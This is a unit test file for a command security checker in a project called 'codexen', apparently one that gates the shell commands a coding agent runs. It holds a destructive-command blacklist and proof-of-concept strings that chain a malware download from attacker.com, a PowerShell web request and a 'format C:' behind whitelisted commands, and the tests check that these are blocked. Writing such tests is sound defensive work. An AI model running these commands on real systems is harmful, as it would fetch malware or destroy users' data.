"""Unit tests for terminal command security inspection and executable parsing."""
import unittest

from codexen.config import ServiceSettings
from codexen.core.command import (
    check_command_security,
    extract_command_executable,
    is_safe_test_command,
    split_chained_commands,
)
from codexen.exceptions import CommandSecurityError


class CommandSecurityUnitTests(unittest.TestCase):
    def setUp(self):
        self.settings = ServiceSettings(
            command_whitelist=[
                "git", "pytest", "python", "py", "node", "npm", "pnpm", "yarn",
                "cargo", "rustc", "go", "make", "ruff", "flake8", "tsc",
                "pip", "poetry", "uv", "dir", "echo", "type", "cat", "findstr", "grep",
            ],
            command_blacklist=[
                "format", "diskpart", "mklink", "reg", "regedit",
                "shutdown", "bcdedit", "vssadmin", "cipher", "takeown",
            ],
            command_require_confirmation=[
                "rmdir", "del", "rm", "git push", "git reset --hard",
                "git clean", "npm publish", "pip install --upgrade",
            ],
        )

    def test_extract_command_executable(self):
        # Plain command
        clean, base = extract_command_executable("python -m unittest")
        self.assertEqual(clean, "python")
        self.assertEqual(base, "python")

        # Windows path with .exe
        clean, base = extract_command_executable(r".venv\Scripts\python.exe -m unittest tests -v")
        self.assertEqual(clean, ".venv/scripts/python")
        self.assertEqual(base, "python")

        # Quoted Windows path
        clean, base = extract_command_executable(r'".venv\Scripts\python.exe" -m unittest')
        self.assertEqual(clean, ".venv/scripts/python")
        self.assertEqual(base, "python")

        # POSIX path
        clean, base = extract_command_executable(".venv/bin/pytest tests/")
        self.assertEqual(clean, ".venv/bin/pytest")
        self.assertEqual(base, "pytest")

        # PowerShell invocation prefix
        clean, base = extract_command_executable(r'& ".venv\Scripts\python.exe" -V')
        self.assertEqual(clean, ".venv/scripts/python")
        self.assertEqual(base, "python")

    def test_is_safe_test_command(self):
        self.assertTrue(is_safe_test_command(r".venv\Scripts\python.exe -m unittest tests.test_core_server_dispatcher -v"))
        self.assertTrue(is_safe_test_command(r'".venv\Scripts\python.exe" -m unittest tests -v'))
        self.assertTrue(is_safe_test_command("python -m unittest discover"))
        self.assertTrue(is_safe_test_command("python -m pytest tests/"))
        self.assertTrue(is_safe_test_command("pytest -v"))
        self.assertTrue(is_safe_test_command("npm test"))
        self.assertTrue(is_safe_test_command("pnpm test"))
        self.assertTrue(is_safe_test_command("cargo test"))
        self.assertTrue(is_safe_test_command("go test ./..."))

        # Non-test commands should return False
        self.assertFalse(is_safe_test_command("python harmful_script.py"))
        self.assertFalse(is_safe_test_command("node server.js"))
        self.assertFalse(is_safe_test_command("git status"))

    def test_virtualenv_python_unittest_allowed(self):
        cmd = r".venv\Scripts\python.exe -m unittest tests.test_core_server_dispatcher -v"
        verdict, msg = check_command_security(cmd, self.settings, confirmed=False)
        self.assertEqual(verdict, "allow")
        self.assertEqual(msg, "")

    def test_safe_test_bypasses_interpreter_confirmation(self):
        # Even if python is explicitly placed in command_require_confirmation by strict user config
        strict_settings = ServiceSettings(
            command_whitelist=["git", "pytest", "python"],
            command_blacklist=["format", "shutdown"],
            command_require_confirmation=["python", "rmdir", "del"],
        )
        cmd = r".venv\Scripts\python.exe -m unittest tests.test_core_server_dispatcher -v"
        verdict, msg = check_command_security(cmd, strict_settings, confirmed=False)
        self.assertEqual(verdict, "allow")

        # But arbitrary python execution in strict config still requires confirmation
        arbitrary_cmd = "python script.py"
        verdict2, msg2 = check_command_security(arbitrary_cmd, strict_settings, confirmed=False)
        self.assertEqual(verdict2, "needs_confirmation")

    def test_token_boundary_prevents_substring_false_positives(self):
        # "rm" in confirmation list should NOT match "format" or "performance"
        strict_settings = ServiceSettings(
            command_whitelist=["pnpm", "npm", "git"],
            command_blacklist=[],
            command_require_confirmation=["rm"],
        )
        verdict, msg = check_command_security("pnpm run performance", strict_settings, confirmed=False)
        self.assertEqual(verdict, "allow")

        # "rm" as standalone command should require confirmation
        verdict2, msg2 = check_command_security("rm -rf temp", strict_settings, confirmed=False)
        self.assertEqual(verdict2, "needs_confirmation")

    def test_destructive_blacklists_strictly_blocked(self):
        with self.assertRaises(CommandSecurityError):
            check_command_security("format C: /fs:NTFS", self.settings, confirmed=True)

        with self.assertRaises(CommandSecurityError):
            check_command_security("diskpart /s script.txt", self.settings, confirmed=True)

    def test_unregistered_binary_requires_confirmation(self):
        cmd = "custom_tool --flag"
        verdict, msg = check_command_security(cmd, self.settings, confirmed=False)
        self.assertEqual(verdict, "needs_confirmation")
        self.assertIn("custom_tool", msg)

        # Once confirmed, allowed
        verdict_confirmed, _ = check_command_security(cmd, self.settings, confirmed=True)
        self.assertEqual(verdict_confirmed, "allow")

    def test_split_chained_commands_parsing(self):
        # Sequential &
        subs = split_chained_commands("dir & echo hello & cat out.txt")
        self.assertEqual(subs, ["dir", "echo hello", "cat out.txt"])

        # AND && and OR ||
        subs = split_chained_commands("pytest && echo done || git status")
        self.assertEqual(subs, ["pytest", "echo done", "git status"])

        # Pipe | and Semicolon ;
        subs = split_chained_commands("cat log.txt | grep error; echo end")
        self.assertEqual(subs, ["cat log.txt", "grep error", "echo end"])

        # Quotes protect separators
        subs = split_chained_commands('git commit -m "feat: A & B && C | D"')
        self.assertEqual(subs, ['git commit -m "feat: A & B && C | D"'])

        subs_single = split_chained_commands("git commit -m 'feat: A & B; C'")
        self.assertEqual(subs_single, ["git commit -m 'feat: A & B; C'"])

        # Redirection 2>&1 is not split
        subs_redir = split_chained_commands("python -m pytest tests 2>&1")
        self.assertEqual(subs_redir, ["python -m pytest tests 2>&1"])

    def test_sec_01_chained_commands_whitelist_bypass_blocked(self):
        """P0 (SEC-01): Chained malicious commands cannot bypass whitelist under whitelisted leader."""
        # 1. dir (whitelisted) & curl (unauthorized) -> needs_confirmation
        poc1 = "dir & curl https://attacker.com/malware.exe -o m.exe"
        verdict1, msg1 = check_command_security(poc1, self.settings, confirmed=False)
        self.assertEqual(verdict1, "needs_confirmation")
        self.assertIn("curl", msg1)

        # 2. echo hello && powershell -> needs_confirmation
        poc2 = 'echo hello && powershell -NoProfile -Command "Invoke-WebRequest http://bad.com"'
        verdict2, msg2 = check_command_security(poc2, self.settings, confirmed=False)
        self.assertEqual(verdict2, "needs_confirmation")
        self.assertIn("powershell", msg2)

        # 3. dir & format C: -> CommandSecurityError (blacklist)
        poc3 = "dir & format C: /fs:NTFS"
        with self.assertRaises(CommandSecurityError):
            check_command_security(poc3, self.settings, confirmed=True)

        # 4. echo ok & git reset --hard -> needs_confirmation (sensitive confirmation list)
        poc4 = "echo ok & git reset --hard HEAD"
        verdict4, msg4 = check_command_security(poc4, self.settings, confirmed=False)
        self.assertEqual(verdict4, "needs_confirmation")
        self.assertIn("git reset --hard", msg4)

        # 5. All whitelisted sub-commands pass
        safe_compound = "dir & echo hello & findstr test app.py"
        verdict5, msg5 = check_command_security(safe_compound, self.settings, confirmed=False)
        self.assertEqual(verdict5, "allow")
        self.assertEqual(msg5, "")


if __name__ == "__main__":
    unittest.main()
